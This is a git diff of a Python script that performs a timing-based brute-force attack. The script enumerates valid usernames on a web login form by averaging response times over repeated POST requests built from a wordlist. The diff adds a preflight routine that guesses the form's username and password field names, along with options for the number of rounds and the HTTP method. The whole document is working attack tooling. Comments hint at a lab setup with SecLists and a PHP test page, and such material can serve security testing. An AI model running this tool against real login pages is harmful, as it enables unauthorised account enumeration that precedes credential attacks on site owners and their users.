@@ -3,6 +3,7 @@ import requests
 import os.path
 import argparse
 import validators
+from samplelists.formfields import userfields, passfields
 
 # Instantiate the parser
 parser = argparse.ArgumentParser(description='Simple brute-force timing attack to get valid username based on average-time after n login requests.')
@@ -10,10 +11,10 @@ parser = argparse.ArgumentParser(description='Simple brute-force timing attack t
 # Required positional arguments
 parser.add_argument('-w', '--wordlist', type=str, help='Wordlist file with the list of usernames.')
 parser.add_argument('-u', '--url', type=str, help='Target URL with login form to attack.')
-parser.add_argument('-n', '--rounds', type=int, default=5, help='Target URL with login form to attack.')
 
 # Optional positional argument
-# parser.add_argument('-n', 'nrounds', type=int, help='Number of rounds to iterate through (Default: 100).')
+parser.add_argument('-n', '--rounds', type=int, default=5, help='Number of attempts per userID to gain statistical significance (default 5).')
+parser.add_argument('-X', '--http-method', type=str, default='POST', help='Specifies the HTTP method for the request (defaults to POST).')
 
 # Parse arguments
 args = parser.parse_args()
@@ -22,9 +23,8 @@ args = parser.parse_args()
 headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
 
 """
-wordlist is expected as simple list, we keep this function to have it ready if needed.
-for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
-change this function if your wordlist has a different format
+Wordlist is expected as simple list only containing userid,
+password is mocked as we are not interested in its value at this point
 """
 def unpack(fline):
     userid = fline
@@ -33,10 +33,28 @@ def unpack(fline):
     return userid, passwd
 
 """
-our PHP example accepts requests via POST, and requires parameters as userid and passwd
+Perform checks against possible username/password field names and get valid ones
 """
-def do_average_req(url, userid, passwd, headers, rounds):
-    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
+def preflight_request(url):
+    # perform target URL request one time
+    data={'username': 'foo', 'password': 'foobar', "submit": "submit"}
+    res = requests.post(url, headers=headers, data=data)
+    print(res.text)
+
+    # look for matching fieldnames from page source
+    for x in range(len(userfields)):
+        for y in range(len(passfields)):
+            print(userfields[x], passfields[y])
+            userfield='name="{}"'.format(userfields[x])
+            passfield='name="{}"'.format(passfields[y])
+            if userfield in res.text and passfield in res.text:
+                print("[+] Correct combination found!")
+
+"""
+Send POST request to endpoint based on known user/pass field name params
+"""
+def do_average_post_request(url, userid, passwd, headers, rounds, userField="userid", passField="passwd"):
+    data = {userField: userid, passField: passwd, "submit": "submit"}
     total_time = 0
     average_time = 0
 
@@ -65,6 +83,8 @@ def main():
         print("[-] Usage: python3 {} -u http://target.url".format(sys.argv[0]))
         sys.exit()
 
+    preflight_request(url)
+
     # open the file, this is our wordlist
     with open(fname) as fh:
         # read file line by line
@@ -77,7 +97,7 @@ def main():
 
             # call do_req() to do the HTTP request
             # perform a number of rounds and get average time
-            res = do_average_req(url, userid, passwd, headers, args.rounds)
+            res = do_average_post_request(url, userid, passwd, headers, args.rounds)
 
 if __name__ == "__main__":
     main()
